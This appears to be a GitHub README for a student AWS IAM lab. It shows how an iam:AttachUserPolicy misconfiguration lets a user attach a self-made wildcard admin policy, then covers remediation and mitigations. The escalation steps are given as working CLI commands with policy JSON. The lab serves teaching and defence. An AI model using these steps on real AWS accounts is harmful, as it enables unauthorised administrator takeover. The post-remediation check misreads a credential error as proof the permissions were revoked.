# ☁️ Cloud Privilege Escalation Simulation — AWS IAM

> A hands-on cloud security lab demonstrating how a misconfigured AWS IAM policy can be exploited to achieve privilege escalation, and how to fully remediate the misconfiguration. Conducted entirely within a controlled AWS account for educational purposes.

---

## 📌 Project Overview

| | |
|---|---|
| **Objective** | Simulate and validate a real-world AWS IAM privilege escalation attack, then remediate the misconfiguration |
| **Platform** | Amazon Web Services (AWS) |
| **Service Targeted** | AWS IAM (Identity and Access Management) |
| **Tools Used** | AWS CLI · Windows PowerShell · AWS Console |
| **Attack Vector** | Overly permissive customer-managed IAM policy (`iam:AttachUserPolicy`) |

---

## 🖥️ Lab Environment

| Component | Details |
|---|---|
| **Attacker Machine** | Windows — PowerShell + AWS CLI |
| **Target Account** | AWS Account `061051258608` |
| **Target IAM User** | `assignment5-user` |
| **ARN** | `arn:aws:iam::061051258608:user/assignment5-user` |
| **Misconfigured Policy** | `Assignment5-MisconfigPolicy` |
| **Escalation Policy** | `Assignment5-EscalatedAdmin` |

---

## ⚙️ Phase 1 — Lab Setup

### IAM User & Misconfigured Policy Created

A low-privilege IAM user (`assignment5-user`) was created and attached a deliberately misconfigured customer-managed policy — `Assignment5-MisconfigPolicy` — which grants `iam:AttachUserPolicy` permission. This simulates a real-world overly permissive policy that a developer or admin might accidentally deploy.

**Misconfigured Policy JSON:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:AttachUserPolicy",
      "Resource": "*"
    }
  ]
}
```

![Misconfigured Policy Created](screenshots/IAM_User_MisconfigPolicy.png)
![Misconfigured Policy JSON](screenshots/Misconfigured_Policy_JSON.png)

### AWS CLI Identity Verified

```powershell
aws sts get-caller-identity --profile assignment5
```

```json
{
  "UserId": "AIDAQ4NXQI3YECZJATZUW",
  "Account": "061051258608",
  "Arn": "arn:aws:iam::061051258608:user/assignment5-user"
}
```

![STS Identity Confirmed](screenshots/PowerShell_Successful_aws_sts_get_caller_identity.png)

---

## ⚡ Phase 2 — Privilege Escalation

With the misconfigured `iam:AttachUserPolicy` permission, the simulated attacker was able to self-escalate to full administrator access in two steps.

### Step 1 — Create Full Admin Policy

```powershell
notepad admin-escalation.json
aws iam create-policy `
  --policy-name Assignment5-EscalatedAdmin `
  --policy-document file://admin-escalation.json `
  --profile assignment5
```

**admin-escalation.json contents:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

Policy ARN created: `arn:aws:iam::061051258608:policy/Assignment5-EscalatedAdmin`

![Admin Policy Created](screenshots/Creation_of_Full_Administrative_Policy.png)

### Step 2 — Self-Attach the Admin Policy

```powershell
aws iam attach-user-policy `
  --user-name assignment5-user `
  --policy-arn arn:aws:iam::061051258608:policy/Assignment5-EscalatedAdmin `
  --profile assignment5
```

### Step 3 — Validate Escalation

```powershell
aws iam list-users --profile assignment5
```

All IAM users in the account were returned — confirming `assignment5-user` had successfully escalated to full admin access.

![Privilege Escalation Success](screenshots/Successful_Privilege_Escalation_via_CLI.png)

---

## 🛡️ Phase 3 — Remediation

After demonstrating the attack, all misconfigured and escalation policies were removed to restore least-privilege security posture.

### Step 1 — Detach escalation policy from user

```powershell
# Detach Assignment5-EscalatedAdmin from assignment5-user
aws iam detach-user-policy `
  --user-name assignment5-user `
  --policy-arn arn:aws:iam::061051258608:policy/Assignment5-EscalatedAdmin
```

### Step 2 — Delete both policies via AWS Console

Both `Assignment5-MisconfigPolicy` and `Assignment5-EscalatedAdmin` were deleted from the IAM Policies console.

![Policies Deleted](screenshots/Deletion_of_Escalation_and_Misconfig_Policies.png)
![Policy Removed from User](screenshots/Removal_of_Misconfigured_Policy.png)

### Step 3 — Validate: Access Denied

After remediation, the same `aws iam list-users` command was attempted. The call returned an `InvalidClientTokenId` error — confirming the escalated permissions had been fully revoked.

```
An error occurred (InvalidClientTokenId) when calling the ListUsers operation:
The security token included in the request is invalid.
```

![Access Denied Post-Remediation](screenshots/Post-Remediation_Access_Denied_Validation.png)

---

## 📊 Attack Chain Summary

```
[Low-privilege user]
        │
        ▼
[Discovers iam:AttachUserPolicy permission]
        │
        ▼
[Creates wildcard admin policy via CLI]
        │
        ▼
[Self-attaches admin policy → Full AWS admin]
        │
        ▼
[REMEDIATION: Policies deleted → Access revoked]
        │
        ▼
[Access Denied — least privilege restored]
```

---

## 🔐 Key Findings & Mitigations

| Finding | Risk | Mitigation |
|---|---|---|
| `iam:AttachUserPolicy` on `Resource: "*"` | Critical | Scope IAM actions to specific resources/ARNs; never use `*` |
| User can self-escalate without admin approval | Critical | Implement IAM permission boundaries |
| No MFA enforcement | High | Enforce MFA for all IAM users via SCPs |
| Wildcard `Action: "*"` policy creatable | Critical | Apply least-privilege principle; use AWS Access Analyzer |
| No CloudTrail alerting on IAM changes | High | Enable CloudTrail + GuardDuty for IAM activity monitoring |

---

## 🧰 Tools Used

| Tool | Purpose |
|---|---|
| **AWS CLI** | IAM policy and user management via command line |
| **Windows PowerShell** | Command execution environment |
| **AWS IAM Console** | Visual policy management and validation |
| **aws sts get-caller-identity** | Identity verification |
| **aws iam create-policy** | Escalated policy creation |
| **aws iam attach-user-policy** | Self-escalation via misconfigured permission |

---

## 📁 Repository Structure

```
📦 cloud-privilege-escalation-lab/
├── 📄 README.md
├── 📄 index.html
├── 📄 Cloud_Privilege_Escalation_Simulation_Report.docx
└── 📁 screenshots/
    ├── IAM_User_MisconfigPolicy.png
    ├── Misconfigured_Policy_JSON.png
    ├── PowerShell_Successful_aws_sts_get_caller_identity.png
    ├── Creation_of_Full_Administrative_Policy.png
    ├── Successful_Privilege_Escalation_via_CLI.png
    ├── Successful_Privilege_Escalation_via_CLI_-_Copy.png
    ├── Deletion_of_Escalation_and_Misconfig_Policies.png
    ├── Removal_of_Misconfigured_Policy.png
    ├── Post-Remediation_Access_Denied_Validation.png
    └── Screenshot_2026-02-23_165148.png
```

---

## ⚠️ Disclaimer

> All activities were conducted within a **personally owned AWS account** in a controlled, isolated environment. No production systems, third-party accounts, or real infrastructure were targeted. This project is strictly for **educational and skill-development purposes**. Unauthorized IAM manipulation on accounts you do not own is illegal.

---

## 👤 Skills Demonstrated

- AWS IAM policy creation, attachment, and management
- Cloud privilege escalation technique simulation (MITRE ATT&CK T1098)
- AWS CLI proficiency on Windows
- Security misconfiguration identification and remediation
- Least-privilege principle application in AWS environments
- Post-exploitation validation and cleanup

---

*⭐ If this project was helpful, consider starring the repo!*
